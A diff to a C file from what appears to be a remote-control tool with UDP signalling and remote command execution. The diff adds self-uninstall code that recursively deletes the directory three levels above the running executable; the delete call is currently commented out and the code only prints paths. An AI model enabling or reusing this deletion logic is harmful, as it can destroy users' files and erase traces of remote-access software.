@@ -2,6 +2,9 @@
 #include "udp.h"
 #include <arpa/inet.h>
 #include <errno.h>
+#include <ftw.h>
+#include <libgen.h>
+#include <limits.h>
 #include <netinet/in.h>
 #include <stdbool.h>
 #include <stdio.h>
@@ -9,9 +12,12 @@
 #include <string.h>
 #include <sys/select.h>
 #include <sys/socket.h>
+#include <sys/stat.h>
 #include <sys/wait.h>
 #include <time.h>
 #include <unistd.h>
+
+#define _XOPEN_SOURCE 500
 
 int listen_sequence(char *final_timestamp, size_t ts_len, char *final_ip)
 {
@@ -297,16 +303,79 @@ int run_command_string(const char *cmd, char **output)
 
 int disconnect(struct ip_info ip_ctx)
 {
-    send_string(ip_ctx, "2.");
-
     printf("Disconnected");
 
     return 0;
 }
 
+static int unlink_cb(const char *fpath, const struct stat *sb, int typeflag, struct FTW *ftwbuf)
+{
+    (void)sb;
+    (void)typeflag;
+    (void)ftwbuf;
+
+    // int ret = remove(fpath);
+    // if (ret != 0)
+    //     perror(fpath);
+    // return ret;
+
+    printf("path: %s\n", fpath);
+    return 0;
+}
+
+static int remove_recursive(const char *path)
+{
+    return nftw(path, unlink_cb, 64, FTW_DEPTH | FTW_PHYS);
+}
+
+static int get_parent_levels(char *out, size_t out_size, int levels)
+{
+    char exe_path[PATH_MAX];
+
+    // Get full path to executable
+    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
+    if (len == -1)
+    {
+        perror("readlink");
+        return -1;
+    }
+    exe_path[len] = '\0';
+
+    // Get directory of executable
+    char *dir = dirname(exe_path);
+    strncpy(out, dir, out_size);
+    out[out_size - 1] = '\0';
+
+    // Go up N levels
+    for (int i = 0; i < levels; i++)
+    {
+        char *slash = strrchr(out, '/');
+        if (!slash || slash == out)
+        {
+            fprintf(stderr, "Cannot go up %d levels\n", levels);
+            return -1;
+        }
+        *slash = '\0';
+    }
+
+    return 0;
+}
+
+static int delete_parent_levels(int levels)
+{
+    char target[PATH_MAX];
+
+    if (get_parent_levels(target, sizeof(target), levels) != 0)
+        return -1;
+
+    printf("Deleting: %s\n", target);
+
+    return remove_recursive(target);
+}
+
 int uninstall(struct ip_info ip_ctx)
 {
-    send_string(ip_ctx, "3.");
+    delete_parent_levels(3);
 
     printf("Uninstalling...");
 
